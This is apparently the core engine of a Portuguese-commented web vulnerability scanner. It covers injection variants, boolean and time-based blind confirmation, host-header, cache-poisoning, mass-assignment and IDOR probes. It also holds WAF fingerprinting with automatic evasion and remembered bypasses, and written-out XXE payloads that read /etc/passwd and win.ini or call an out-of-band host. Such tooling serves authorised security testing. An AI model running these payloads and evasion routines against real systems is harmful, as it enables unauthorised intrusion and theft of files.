"""
core/engine.py
==============

Motor de varredura. Para cada (módulo × ponto de injeção):

  1. estabelece um baseline (sem injeção) para calibrar diff e tempo;
  2. para cada payload do módulo, gera variantes via transforms (bypass/encode);
  3. envia cada variante, aplica os detectores declarados pelo módulo;
  4. combina os sinais em um Finding quando a confiança cruza o limiar.

Payloads time-based (delay>0) são enviados em série e reconfirmados, evitando
falsos positivos causados por concorrência. Payloads OOB são coletados e
reavaliados ao final, após um período de carência para os callbacks chegarem.
"""
from __future__ import annotations

import asyncio
import re
import secrets
from dataclasses import dataclass, field
from typing import List, Optional

from urllib.parse import urlsplit

from .http_client import HttpClient, Response
from .scope import Scope
from .target import RequestTemplate, InjectionPoint, PreparedRequest, curl_repro


def _host_of(url: str) -> str:
    return (urlsplit(url).hostname or "").lower()
from . import detector as det
from . import waf as wafmod
from . import waf_cache
from encoders import expand, EVASION
from modules.base import Module, Payload, Finding


@dataclass
class ScanOptions:
    max_variants: int = 12          # variantes por payload (após transforms)
    threshold: float = 0.5          # confiança mínima para reportar
    all_variants: bool = False      # não parar no 1º hit forte por payload
    inject_mode: str = "replace"    # replace | append
    oob_grace: float = 8.0          # segundos aguardando callbacks OOB
    time_confirm: bool = True       # reconfirma hits time-based
    aggressive: bool = False        # aplica TODOS os encoders em cada payload
    chain_depth: int = 1            # encadeamento de encoders (>1 = combinações)
    extra_transforms: List[str] = field(default_factory=list)  # encoders extras/globais
    waf_detect: bool = True         # detecta bloqueio de WAF e reporta
    waf_adapt: bool = True          # ao detectar WAF, re-testa o parâmetro com evasão
    evasion_max_variants: int = 250  # teto de variantes na fase de evasão
    verify: bool = False            # re-envia o payload vencedor e exige o sinal de novo
    hpp: bool = False               # HTTP Parameter Pollution (param=a&param=b)
    dedup: bool = True              # não reenvia a requisição idêntica (por módulo×ponto)
    blind: bool = True              # roda payloads time-based (blind); False = pula (bem mais rápido)
    time_variants: int = 4          # teto de variantes por payload TIME-BASED (é serial; encoding
                                    # quase não muda se o `sleep` executa — não vale explodir)
    waf_cache: bool = True          # persiste/lê bypasses aprendidos entre execuções
    waf_cache_path: str = ""        # caminho do cache (vazio = default ~/.hunterparam)

    def transforms_for(self, module) -> List[str]:
        """Resolve o conjunto de encoders para um módulo."""
        from encoders import REGISTRY, resolve_names
        if self.aggressive:
            base = list(REGISTRY.keys())          # arsenal completo
        else:
            base = list(module.transforms)
            if self.extra_transforms:
                base += resolve_names(self.extra_transforms)
        # dedup preservando ordem
        seen = set()
        return [x for x in base if not (x in seen or seen.add(x))]


@dataclass
class _OOBPending:
    token: str
    module: str
    point: str
    method: str
    url: str
    payload: str
    base_payload: str
    transform: str
    tags: list


class Scanner:
    def __init__(self, client: HttpClient, scope: Scope, opts: ScanOptions,
                 oob_server=None, on_finding=None, on_event=None):
        self.client = client
        self.scope = scope
        self.opts = opts
        self.oob = oob_server
        self.on_finding = on_finding
        self.on_event = on_event          # callable(level:int, msg:str) p/ verbose
        self._oob_pending: List[_OOBPending] = []
        self._waf_reported: set = set()   # rotas já reportadas como WAF
        self.waf_points: dict = {}        # str(point) -> vendor detectado
        # fingerprint PASSIVO por ROTA (host+path): rotas diferentes podem ter
        # WAF ou não. atualizado continuamente conforme as respostas chegam.
        self.known_waf: dict = {}         # rota (base_url) -> vendor
        self.host_bypasses: dict = {}     # host -> [transforms que já furaram, + recentes 1º]
        self.host_vendor: dict = {}       # host -> vendor (agregado p/ persistir entre runs)
        # cache PERSISTENTE: semeia os bypasses aprendidos em execuções anteriores
        # (tentados primeiro em host com WAF) e a dica de vendor por host.
        self._cache_vendor_hint: dict = {}
        if opts.waf_cache:
            try:
                v, bp = waf_cache.load(opts.waf_cache_path or None)
                self._cache_vendor_hint = v
                self.host_bypasses.update(bp)
            except Exception:   # noqa: BLE001 — cache é otimização, nunca fatal
                pass
        self._baseline_cache: dict = {}   # id(template) -> (baseline, base_elapsed)
        self._baseline_meta: dict = {}    # id(template) -> {stable, len_lo, len_hi, elapsed}
        self.authenticator = None         # core.auth.Authenticator (re-login p/ sessão)
        self._reauths = 0

    def _ev(self, level: int, msg: str):
        if self.on_event:
            self.on_event(level, msg)

    # ------------------------------------------------------------------
    async def _get_baseline(self, template: RequestTemplate):
        """
        Baseline é idêntico para todos os pontos de um template — cacheia.
        Manda 3 amostras e MODELA A ESTABILIDADE: se o conteúdo já varia sozinho
        (página dinâmica), marca instável e o detector `diff` é desligado naquele
        alvo — isso elimina a maior fonte de falso-positivo.
        """
        key = id(template)
        if key in self._baseline_cache:
            return self._baseline_cache[key]
        base = template.baseline()
        if not self.scope.allows(base.url):
            self._baseline_cache[key] = (None, 0.0)
            self._baseline_meta[key] = {"stable": False, "len_lo": 0, "len_hi": 0, "elapsed": 0.0}
            return (None, 0.0)
        # re-login automático se a sessão expirou (detecção pelo marcador de logado)
        first = await self.client.send(base)
        if self.authenticator and self.authenticator.looks_logged_out(first.text) and self._reauths < 5:
            self._reauths += 1
            ok, _ = await self.authenticator.login()
            first = await self.client.send(base)
        samples = [first] + [await self.client.send(base) for _ in range(2)]
        oks = [s for s in samples if s.ok]
        baseline = max(oks, key=lambda s: s.length) if oks else samples[0]
        elapseds = sorted(s.elapsed for s in oks) or [0.0]
        base_elapsed = elapseds[len(elapseds) // 2]        # mediana
        # estabilidade: similaridade mínima entre amostras + variação de tamanho
        stable = True
        if len(oks) >= 2:
            lens = [s.length for s in oks]
            len_lo, len_hi = min(lens), max(lens)
            len_var = (len_hi - len_lo) / max(1, len_hi)
            sim = min(det._similarity(oks[0].text, s.text) for s in oks[1:])
            stable = (sim >= 0.98) and (len_var <= 0.03)
        else:
            len_lo = len_hi = baseline.length
        self._baseline_cache[key] = (baseline, base_elapsed)
        self._baseline_meta[key] = {"stable": stable, "len_lo": len_lo,
                                    "len_hi": len_hi, "elapsed": base_elapsed}
        self._ev(2, f"baseline {base.method} {base.url[:120]} — "
                    f"{baseline.status} {baseline.length}B {base_elapsed:.2f}s "
                    f"{'ESTÁVEL' if stable else 'instável (diff OFF)'}")
        return (baseline, base_elapsed)

    def _record_bypass(self, host: str, label: str):
        """Memoriza os encoders que furaram o WAF deste host (move-to-front)."""
        if not host or label in ("raw", "-", ""):
            return
        lst = self.host_bypasses.setdefault(host, [])
        for name in reversed(label.split("+")):   # componentes do encadeamento
            if name in ("raw", ""):
                continue
            if name in lst:
                lst.remove(name)
            lst.insert(0, name)
        del lst[12:]   # mantém só os 12 mais recentes/eficazes

    def save_cache(self) -> bool:
        """Persiste o aprendizado (vendor + bypasses por host) p/ o próximo run.
        Best-effort: nunca lança. Chamado ao fim do scan (mesmo se interrompido)."""
        if not self.opts.waf_cache:
            return False
        try:
            return waf_cache.save(self.host_vendor, self.host_bypasses,
                                  self.opts.waf_cache_path or None)
        except Exception:   # noqa: BLE001
            return False

    # ------------------------------------------------------------------
    async def fingerprint(self, template: RequestTemplate,
                          point: InjectionPoint) -> Optional[tuple]:
        """
        Fingerprint ATIVO: envia payloads-sonda num parâmetro e observa se há
        bloqueio + qual fabricante. Memoriza por ROTA. Retorna (present, vendor).
        """
        base = template.baseline()
        if not self.scope.allows(base.url):
            return None
        baseline = await self.client.send(base)
        route = template.base_url
        blocked = 0
        vendor = None
        for _name, probe in wafmod.PROBES:
            req = template.render(point, probe, mode="replace")
            if not self.scope.allows(req.url):
                continue
            resp = await self.client.send(req)
            v = wafmod.identify_vendor(resp)
            if v and not vendor:
                vendor = v
            sig = wafmod.inspect(resp, baseline)
            if sig.blocked:
                blocked += 1
                if sig.vendor and not vendor:
                    vendor = sig.vendor
        present = blocked > 0 or vendor is not None
        if present:
            self.known_waf[route] = vendor or "genérico"
            if vendor:
                self.waf_points.setdefault(str(point), vendor)
                self.host_vendor[_host_of(route)] = vendor
        return (present, vendor)

    # ------------------------------------------------------------------
    def _build_payload(self, p: Payload):
        """Substitui placeholders. Retorna (valor, marker, token)."""
        val = p.value
        marker = None
        token = None
        if "{MARK}" in val:
            marker = "phm" + secrets.token_hex(5)
            val = val.replace("{MARK}", marker)
        if p.oob or "{OOB" in val:
            token = None
            if self.oob is not None:
                from .oob import new_token
                token = new_token()
                val = (val.replace("{OOBURL}", self.oob.payload_url(token))
                          .replace("{OOBHOST}", self.oob.payload_host(token))
                          .replace("{OOBFQDN}", self.oob.payload_fqdn(token)))
        return val, marker, token

    # ------------------------------------------------------------------
    async def scan_point(self, module: Module, template: RequestTemplate,
                         point: InjectionPoint) -> List[Finding]:
        findings: List[Finding] = []

        # baseline (cacheado por template — igual para todos os pontos)
        baseline, base_elapsed = await self._get_baseline(template)
        if baseline is None:
            return findings
        host = _host_of(template.base_url)
        route = template.base_url          # WAF é rastreado por ROTA

        # payloads que exigem OOB são inúteis (e podem travar o alvo em DNS) se
        # não há servidor OOB configurado — filtra-os fora.
        def _usable(p):
            return not ((p.oob or "{OOB" in p.value) and self.oob is None)
        pl = [p for p in module.payloads if _usable(p)]
        # --no-blind: pula os time-based (que são SERIAIS e o maior custo de tempo);
        # mantém signature/diff/reflection/oob. Bem mais rápido em troca de não
        # pegar injeção CEGA sem saída (use --webhook/OOB p/ blind sem custo serial).
        time_payloads = [p for p in pl if p.delay > 0] if self.opts.blind else []
        normal_payloads = [p for p in pl if p.delay <= 0]

        # transforms/limites da FASE 1 (normal). Se a rota já é WAF conhecida e
        # temos bypasses memorizados do host, tenta-os PRIMEIRO (acha o furo antes).
        base_transforms = self.opts.transforms_for(module)
        if self.known_waf.get(route) and self.host_bypasses.get(host):
            cached = self.host_bypasses[host]
            base_transforms = cached + [t for t in base_transforms if t not in cached]
        base_chain = self.opts.chain_depth
        base_limit = self.opts.max_variants

        # ---- FASE 1: payloads normais (concorrentes) ----
        self._ev(1, f"⚙ FASE 1  {module.name} @ {point}  "
                    f"({len(normal_payloads)} payloads × até {base_limit} variantes"
                    f"{f', {len(time_payloads)} time-based' if time_payloads else ''})")
        # dedup por (módulo × ponto): payloads distintos podem colapsar na MESMA
        # requisição após o encode (ex.: '../' em profundidades diferentes viram a
        # mesma string em html_dec/fullwidth). Não reenviamos a requisição idêntica.
        seen_reqs = set() if self.opts.dedup else None
        waf_hard = waf_soft = attempts = 0
        tasks = [self._run_payload(module, template, point, p, baseline,
                                   base_transforms, base_chain, base_limit, seen_reqs)
                 for p in normal_payloads]
        for coro in asyncio.as_completed(tasks):
            res, hard, soft, n = await coro
            waf_hard += hard; waf_soft += soft; attempts += n
            for f in res:
                findings.append(f)
                if self.known_waf.get(host):
                    self._record_bypass(host, f.transform)
                if self.on_finding:
                    self.on_finding(f)

        # ---- FASE 2: ESCALONAMENTO se WAF detectado no parâmetro ----
        # confiável: qualquer bloqueio por status/página. drops só valem se
        # SISTEMÁTICOS (>=8 e >=25% das tentativas) — evita FP de erro pontual.
        # Se o fingerprint ATIVO já marcou o host como WAF, escala mesmo sem
        # bloqueio na fase 1 (o parâmetro pode ser filtrado só p/ certos payloads).
        escalated = False
        drops_systemic = waf_soft >= 8 and waf_soft >= 0.25 * max(1, attempts)
        host_waf = self.known_waf.get(route)
        waf_detected = waf_hard > 0 or drops_systemic or host_waf is not None
        if waf_detected and self.opts.waf_detect:
            vendor = self.waf_points.get(str(point)) or host_waf
            if vendor == "genérico":
                vendor = None
            # sem vendor identificado neste run: usa a dica persistida do host
            # (só p/ ORDENAR a evasão pelo perfil do fabricante — não dispara nada).
            if not vendor:
                vendor = self._cache_vendor_hint.get(host)
            if vendor:
                self.host_vendor[host] = vendor
            self._report_waf(module, template, point, vendor, waf_hard + waf_soft)
            if self.opts.waf_adapt:
                escalated = True
                self._ev(1, f"⚠ FASE 2  WAF em {point}"
                            f"{f' [{vendor}]' if vendor else ''} → re-testando com evasão "
                            f"(até {self.opts.evasion_max_variants} variantes)")
                # ordem: bypasses memorizados do host -> perfil do fabricante -> resto
                cached = self.host_bypasses.get(host, [])
                ev_transforms = cached + [t for t in wafmod.evasion_for(vendor, EVASION) if t not in cached]
                ev_transforms += [t for t in base_transforms if t not in ev_transforms]
                tasks2 = [self._run_payload(module, template, point, p, baseline,
                                            ev_transforms, max(2, base_chain), self.opts.evasion_max_variants,
                                            seen_reqs)
                          for p in normal_payloads]
                for coro in asyncio.as_completed(tasks2):
                    res, _h, _s, _n = await coro
                    for f in res:
                        findings.append(f)
                        self._record_bypass(host, f.transform)   # aprende o furo
                        if self.on_finding:
                            self.on_finding(f)

        # ---- confirmação por ORÁCULO BOOLEANO (SQLi/NoSQLi) ----
        if module.boolean_pairs:
            self._ev(2, f"  oráculo booleano @ {point} (true/false)")
            bf = await self._boolean_confirm(module, template, point, baseline)
            if bf:
                findings.append(bf)
                if self.on_finding:
                    self.on_finding(bf)

        # ---- payloads time-based (serial + confirmação) ----
        # early-stop: um hit time-based já confirma o parâmetro; testar os outros
        # (cada um com sleep) só desperdiça tempo. --all-variants desliga o corte.
        for p in time_payloads:
            self._ev(2, f"  time-based @ {point} delay={p.delay}s (serial + reconfirmação)")
            f = await self._run_time_payload(module, template, point, p, base_elapsed, escalated)
            if f:
                findings.append(f)
                if self.on_finding:
                    self.on_finding(f)
                if not self.opts.all_variants:
                    break

        return findings

    # ------------------------------------------------------------------
    def _report_waf(self, module, template, point, vendor, blocked):
        key = str(point)
        if key in self._waf_reported or not self.on_finding:
            return
        self._waf_reported.add(key)
        vend = f" [{vendor}]" if vendor else ""
        f = Finding(
            module="waf", point=key, method=template.method,
            url=template.base_url, payload="", base_payload="(sondagem)",
            transform="-", confidence=0.6, detectors=["waf-block"],
            evidence=f"WAF/IPS bloqueou {blocked} payload(s) neste parâmetro{vend}"
                     f" — escalando p/ evasão" if self.opts.waf_adapt else
                     f"WAF/IPS detectado{vend}",
            tags=["waf", vendor or "generico"],
        )
        self.on_finding(f)

    # ------------------------------------------------------------------
    def _signals(self, module, resp, baseline, marker, variant, allow_diff=True,
                 base_value=None) -> List[det.Signal]:
        signals: List[det.Signal] = []
        if "signature" in module.detectors:
            # XSS: a reflexão do payload É o sinal, então não suprime;
            # nos demais, suprime match que também aparece no payload injetado —
            # comparando com o payload ORIGINAL (decodificado) E a variante, pois
            # o alvo decodifica e reflete a forma original (encoding esconderia).
            inj = "" if module.reflected_signatures else ((base_value or "") + "\n" + variant)
            signals.append(det.sig_detect(resp, module.signatures, baseline, injected=inj))
        if "reflection" in module.detectors and marker:
            signals.append(det.reflect_detect(resp, marker))
        # diff só quando o baseline é ESTÁVEL (senão vira falso-positivo)
        if "diff" in module.detectors and allow_diff:
            signals.append(det.diff_detect(resp, baseline, module.diff_len_ratio))
        if "redirect" in module.detectors:
            signals.append(det.location_detect(resp))
        if "crlf" in module.detectors:
            signals.append(det.crlf_detect(resp))
        return signals

    def _diff_ok(self, template) -> bool:
        meta = self._baseline_meta.get(id(template))
        return bool(meta and meta.get("stable", True))

    async def _boolean_confirm(self, module, template, point, baseline) -> Optional[Finding]:
        """
        Oráculo booleano: envia payload VERDADEIRO e FALSO (append) e confirma a
        injeção quando true≈baseline e true≠false. Muito mais confiável que diff:
        um parâmetro não-injetável trata os dois como literais -> respostas iguais.
        """
        for pair in module.boolean_pairs:
            tv, fv = pair.get("true"), pair.get("false")
            if tv is None or fv is None:
                continue
            rtreq = template.render(point, tv, mode="append")
            rt = await self.client.send(rtreq)
            rf = await self.client.send(template.render(point, fv, mode="append"))
            if not (rt.ok and rf.ok):
                continue
            sim_tf = det._similarity(rt.text, rf.text)      # true vs false
            sim_bt = det._similarity(baseline.text, rt.text)  # baseline vs true
            # true parecido com baseline, mas claramente diferente do false
            if sim_bt >= 0.90 and sim_tf <= 0.85 and rt.status == baseline.status:
                return Finding(
                    module=module.name, point=str(point), method=template.method,
                    url=rtreq.url, payload=f"append:{tv} / {fv}",
                    base_payload=f"boolean:{tv}", transform="raw", confidence=0.92,
                    detectors=["boolean"],
                    evidence=f"oráculo booleano: true≈baseline (sim={sim_bt:.2f}), "
                             f"true≠false (sim={sim_tf:.2f}) — injeção confirmada",
                    tags=["boolean", "confirmed"], repro=curl_repro(rtreq))
        return None

    async def _verify(self, module, template, point, variant, marker, baseline,
                      want: set, mode: str = "replace") -> bool:
        """Reenvia o payload vencedor; confirma se algum detector original repete."""
        req = template.render(point, variant, mode=mode)
        resp = await self.client.send(req)
        for s in self._signals(module, resp, baseline, marker, variant):
            if s.hit and s.detector in want:
                return True
        return False

    # ------------------------------------------------------------------
    async def _run_payload(self, module, template, point, p: Payload,
                           baseline: Response, transforms, chain_depth, limit,
                           seen: Optional[set] = None):
        out: List[Finding] = []
        waf_hard = 0        # status/página de bloqueio (confiável)
        waf_soft = 0        # drops de conexão (fraco)
        attempts = 0
        route = template.base_url
        value, marker, token = self._build_payload(p)
        variants = expand(value, transforms, chain_depth=chain_depth, limit=limit)

        # modos de injeção: replace/append + HPP (se ligado e ponto é query/body)
        modes = [self.opts.inject_mode]
        if self.opts.hpp and point.location in ("query", "body"):
            modes += ["hpp", "hpp_first"]

        confirmed = False
        allow_diff = self._diff_ok(template)
        for variant, tname in variants:
            if confirmed:
                break
            for mode in modes:
                req = template.render(point, variant, mode=mode)
                req.module = module.name
                req.label = tname if mode in ("replace", "append") else f"{tname}|{mode}"
                req.tags = list(p.tags)
                # dedup pela REQUISIÇÃO FINAL (url + corpo): payloads/variantes
                # distintos podem colapsar na mesma requisição após o render/encode.
                # add ANTES do await (asyncio cooperativo, sem await entre = atômico).
                if seen is not None:
                    dkey = (req.method, req.url, repr(req.data), repr(req.json_body))
                    if dkey in seen:
                        continue
                    seen.add(dkey)
                if not self.scope.allows(req.url):
                    continue
                attempts += 1
                resp = await self.client.send(req)
                label = tname if mode in ("replace", "append") else f"{tname}|{mode}"

                # detecção de WAF (fabricante do ponto/ROTA) + backoff stealth
                if self.opts.waf_detect or self.client.stealth:
                    wsig = wafmod.inspect(resp, baseline)
                    if wsig.vendor:
                        self.waf_points.setdefault(str(point), wsig.vendor)
                        self.known_waf.setdefault(route, wsig.vendor)   # passivo por rota
                    if wsig.blocked:
                        self.known_waf.setdefault(route, wsig.vendor or "genérico")
                        self.client.note_block()
                        if wsig.kind == "drop":
                            waf_soft += 1
                        else:
                            waf_hard += 1
                        continue
                    else:
                        self.client.note_ok()

                hits = [s for s in self._signals(module, resp, baseline, marker, variant,
                                                 allow_diff, base_value=value) if s.hit]
                if hits:
                    conf = max(s.confidence for s in hits)
                    if conf >= self.opts.threshold:
                        if self.opts.verify and not await self._verify(
                                module, template, point, variant, marker, baseline,
                                {s.detector for s in hits}, mode):
                            continue
                        out.append(Finding(
                            module=module.name, point=str(point),
                            method=req.method, url=req.url,
                            payload=variant, base_payload=value, transform=label,
                            confidence=conf,
                            detectors=[s.detector for s in hits],
                            evidence=" | ".join(s.evidence for s in hits if s.evidence),
                            tags=p.tags + (["hpp"] if mode.startswith("hpp") else []),
                            repro=curl_repro(req),
                        ))
                        if conf >= 0.9 and not self.opts.all_variants:
                            confirmed = True
                            break  # payload confirmado; poupa requisições

                if token and self.oob is not None:
                    self._oob_pending.append(_OOBPending(
                        token=token, module=module.name, point=str(point),
                        method=req.method, url=req.url, payload=variant,
                        base_payload=value, transform=label, tags=p.tags,
                    ))
        return out, waf_hard, waf_soft, attempts

    # ------------------------------------------------------------------
    async def _run_time_payload(self, module, template, point, p: Payload,
                                base_elapsed: float, escalated: bool = False) -> Optional[Finding]:
        value, marker, token = self._build_payload(p)
        # para time-based usamos poucas variantes para não estourar tempo total.
        # se o parâmetro está sob WAF (escalated), usa o arsenal de evasão.
        # time-based é SERIAL e insensível a encoding: capamos as variantes num
        # teto pequeno (time_variants). Sob WAF (escalated), damos um pouco mais
        # (3x) porque aí o encoding importa p/ furar o filtro.
        tv = max(1, self.opts.time_variants)
        if escalated:
            transforms = EVASION + [t for t in self.opts.transforms_for(module) if t not in EVASION]
            limit = min(tv * 3, max(3, self.opts.evasion_max_variants // 6))
        else:
            transforms = self.opts.transforms_for(module)
            limit = min(tv, max(2, self.opts.max_variants // 3))
        variants = expand(value, transforms, chain_depth=1, limit=limit)
        for variant, tname in variants:
            req = template.render(point, variant, mode=self.opts.inject_mode)
            req.module = module.name
            req.label = tname
            req.tags = list(p.tags) + ["time-based"]
            if not self.scope.allows(req.url):
                continue
            resp = await self.client.send(req)
            sig = det.time_detect(resp, base_elapsed, p.delay, module.time_margin)
            if not sig.hit:
                continue
            # confirmação ESTATÍSTICA: manda mais amostras e exige que a MEDIANA
            # ultrapasse o limiar (imune a um pico de latência de rede isolado).
            if self.opts.time_confirm:
                extra = [await self.client.send(req) for _ in range(2)]
                times = sorted([resp.elapsed] + [r.elapsed for r in extra])
                median = times[len(times) // 2]
                threshold = base_elapsed + p.delay - module.time_margin
                if median < threshold:
                    continue
                evidence = (f"time-based confirmado: mediana {median:.2f}s de {times} "
                            f"(baseline {base_elapsed:.2f}s + delay {p.delay}s)")
                conf = min(0.97, 0.85 + 0.03 * (median - threshold))
            else:
                evidence = sig.evidence
                conf = sig.confidence
            return Finding(
                module=module.name, point=str(point), method=req.method, url=req.url,
                payload=variant, base_payload=value, transform=tname,
                confidence=conf, detectors=["time"], evidence=evidence, tags=p.tags,
                repro=curl_repro(req),
            )
        return None

    # ------------------------------------------------------------------
    # Host-header injection (cache poisoning / password-reset poisoning / redirect)
    HOST_HEADERS = ["Host", "X-Forwarded-Host", "X-Forwarded-For", "X-Host",
                    "X-Forwarded-Server", "X-HTTP-Host-Override", "Forwarded",
                    "X-Original-Host", "X-Rewrite-URL"]

    async def scan_host_header(self, template: RequestTemplate) -> List[Finding]:
        out: List[Finding] = []
        base = template.baseline()
        if not self.scope.allows(base.url):
            return out
        for hdr in self.HOST_HEADERS:
            token = "phh" + secrets.token_hex(4)
            canary = f"{token}.evil-canary.test"
            val = f"host={canary}" if hdr == "Forwarded" else canary
            req = PreparedRequest(
                method=base.method, url=base.url,
                headers={**base.headers, hdr: val}, cookies=base.cookies,
                data=base.data, json_body=base.json_body, injected=canary,
                point=InjectionPoint(hdr, "header", ""),
            )
            resp = await self.client.send(req)
            if not resp.ok:
                continue
            loc = resp.headers.get("location", "") or resp.headers.get("refresh", "")
            in_loc = token in loc
            in_body = token in (resp.text or "")
            if in_loc or in_body:
                where = "Location/redirect" if in_loc else "corpo (link/absoluto)"
                conf = 0.85 if in_loc else 0.6
                f = Finding(
                    module="host_header", point=f"header:{hdr}", method=req.method,
                    url=base.url, payload=canary, base_payload=canary, transform="raw",
                    confidence=conf, detectors=["reflection"],
                    evidence=f"canário do Host refletido em {where}: {canary}",
                    tags=["host-header"],
                )
                out.append(f)
                if self.on_finding:
                    self.on_finding(f)
        return out

    # ------------------------------------------------------------------
    # XXE — injeta corpo XML com entidade externa (leitura de arquivo / OOB)
    async def scan_xxe(self, template: RequestTemplate) -> List[Finding]:
        out: List[Finding] = []
        base = template.baseline()
        if not self.scope.allows(base.url):
            return out
        method = base.method if base.method in ("POST", "PUT", "PATCH") else "POST"
        sigs = det.compile_signatures([r"root:.*:0:0:", r"\[boot loader\]",
                                       r"for 16-bit app support", r"daemon:.*:/usr/sbin"])

        payloads = [
            ("file", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'),
            ("file-win", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>'),
            ("php-filter", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>'),
            ("oob", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{OOBURL}">]><r>&xxe;</r>'),
            ("param-oob", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "{OOBURL}"> %p;]><r>x</r>'),
        ]
        for name, body in payloads:
            token = None
            if "{OOB" in body:
                if self.oob is None:
                    continue
                from .oob import new_token
                token = new_token()
                body = body.replace("{OOBURL}", self.oob.payload_url(token))
            req = PreparedRequest(
                method=method, url=base.url,
                headers={**base.headers, "Content-Type": "application/xml"},
                cookies=base.cookies, data=body, json_body=None, injected=body,
                point=InjectionPoint("body", "xml", ""),
            )
            resp = await self.client.send(req)
            if token and self.oob is not None:
                self._oob_pending.append(_OOBPending(
                    token=token, module="xxe", point="xml:body", method=method,
                    url=base.url, payload=body, base_payload=f"xxe:{name}",
                    transform="raw", tags=["xxe", "oob"]))
            if resp.ok:
                sig = det.sig_detect(resp, sigs, injected=body)
                if sig.hit:
                    f = Finding(module="xxe", point="xml:body", method=method,
                                url=base.url, payload=body, base_payload=f"xxe:{name}",
                                transform="raw", confidence=0.95, detectors=["signature"],
                                evidence=sig.evidence, tags=["xxe", name])
                    out.append(f)
                    if self.on_finding:
                        self.on_finding(f)
        return out

    # ------------------------------------------------------------------
    # Mass assignment: injeta campos sensíveis no corpo JSON e vê se "colam"
    MASS_FIELDS = {
        "role": "admin", "roles": ["admin"], "is_admin": True, "isAdmin": True,
        "admin": True, "is_staff": True, "is_superuser": True, "superuser": True,
        "is_active": True, "active": True, "verified": True, "is_verified": True,
        "email_verified": True, "approved": True, "level": 99, "access_level": 99,
        "account_type": "admin", "plan": "enterprise", "permissions": ["*"],
        "balance": 999999, "credit": 999999, "points": 999999, "banned": False,
    }

    async def scan_mass_assignment(self, template: RequestTemplate) -> List[Finding]:
        out: List[Finding] = []
        if not isinstance(template.json_body, dict):
            return out
        base = template.baseline()
        if not self.scope.allows(base.url):
            return out
        baseline = await self.client.send(base)
        import copy
        for field, val in self.MASS_FIELDS.items():
            if field in template.json_body:
                continue
            t = copy.deepcopy(template)
            t.json_body = dict(template.json_body)
            t.json_body[field] = val
            req = t.baseline()
            resp = await self.client.send(req)
            if not resp.ok:
                continue
            # heurística: o campo injetado aparece REFLETIDO na resposta (aceito)
            token = f'"{field}"'
            if token in resp.text and (token not in (baseline.text or "")):
                out.append(Finding(
                    module="mass_assignment", point=f"json:{field}", method=req.method,
                    url=base.url, payload=f"{field}={val}", base_payload=f"{field}={val}",
                    transform="raw", confidence=0.6, detectors=["reflection"],
                    evidence=f"campo sensível '{field}' refletido na resposta (possível mass assignment)",
                    tags=["mass-assignment"]))
                if self.on_finding:
                    self.on_finding(out[-1])
        return out

    # ------------------------------------------------------------------
    # Cache poisoning: canário em header não-chaveado + indícios de cache
    CACHE_HEADERS = ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto",
                     "X-Host", "X-Forwarded-Server", "X-Forwarded-Port",
                     "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix"]

    async def scan_cache_poison(self, template: RequestTemplate) -> List[Finding]:
        out: List[Finding] = []
        base = template.baseline()
        if not self.scope.allows(base.url):
            return out
        for hdr in self.CACHE_HEADERS:
            token = "phc" + secrets.token_hex(4)
            canary = f"{token}.evil-canary.test"
            req = PreparedRequest(
                method=base.method, url=base.url,
                headers={**base.headers, hdr: canary}, cookies=base.cookies,
                data=base.data, json_body=base.json_body, injected=canary,
                point=InjectionPoint(hdr, "header", ""))
            resp = await self.client.send(req)
            if not resp.ok:
                continue
            reflected = token in (resp.text or "") or token in resp.headers.get("location", "")
            if not reflected:
                continue
            # indícios de cacheabilidade
            h = {k.lower(): str(v).lower() for k, v in resp.headers.items()}
            cacheable = ("age" in h or "hit" in h.get("x-cache", "")
                         or "public" in h.get("cache-control", "")
                         or "cf-cache-status" in h or "x-cache-hits" in h)
            vary = h.get("vary", "")
            unkeyed = hdr.lower() not in vary
            conf = 0.85 if (cacheable and unkeyed) else 0.5
            note = "cacheável e não-Vary" if (cacheable and unkeyed) else "refletido (verificar cache)"
            out.append(Finding(
                module="cache_poison", point=f"header:{hdr}", method=req.method,
                url=base.url, payload=canary, base_payload=canary, transform="raw",
                confidence=conf, detectors=["reflection"],
                evidence=f"header não-chaveado '{hdr}' refletido — {note}",
                tags=["cache-poisoning"]))
            if self.on_finding:
                self.on_finding(out[-1])
        return out

    # ------------------------------------------------------------------
    # IDOR: troca o valor de um parâmetro id-like e vê se retorna OUTRO objeto
    async def scan_idor(self, template: RequestTemplate, point: InjectionPoint) -> List[Finding]:
        out: List[Finding] = []
        baseline, _ = await self._get_baseline(template)
        if baseline is None or not baseline.ok:
            return out
        # gera valores de teste a partir do original
        orig = point.original or ""
        tests = []
        if orig.isdigit():
            n = int(orig)
            tests = [str(n - 1), str(n + 1), str(n + 2), "1", "2", "0", "1000", "99999"]
        else:
            tests = ["1", "2", "0", "admin", "00000000-0000-0000-0000-000000000000"]
        tests = [t for t in dict.fromkeys(tests) if t != orig][:6]

        err_markers = re.compile(r"(not\s*found|forbidden|denied|unauthor|no\s*such|"
                                 r"invalid|does\s*not\s*exist|error)", re.I)
        for tv in tests:
            req = template.render(point, tv, mode="replace")
            if not self.scope.allows(req.url):
                continue
            resp = await self.client.send(req)
            if not resp.ok or resp.status != baseline.status or resp.length < 50:
                continue
            if err_markers.search(resp.text or ""):
                continue
            sim = det._similarity(baseline.text, resp.text)
            # objeto DIFERENTE mas com estrutura parecida (mesmo template, dados de outro)
            if 0.30 <= sim <= 0.97:
                f = Finding(
                    module="idor", point=str(point), method=req.method, url=req.url,
                    payload=tv, base_payload=f"{point.name}={tv}", transform="raw",
                    confidence=0.55, detectors=["diff"],
                    evidence=f"valor '{tv}' retornou objeto diferente (similaridade={sim:.2f}, "
                             f"status {resp.status}) — possível IDOR",
                    tags=["idor", "access-control"])
                out.append(f)
                if self.on_finding:
                    self.on_finding(f)
                break   # um indício basta para reportar
        return out

    # ------------------------------------------------------------------
    async def resolve_oob(self) -> List[Finding]:
        """Aguarda a carência e transforma callbacks OOB em findings."""
        out: List[Finding] = []
        if not self._oob_pending or self.oob is None:
            return out
        await asyncio.sleep(self.opts.oob_grace)
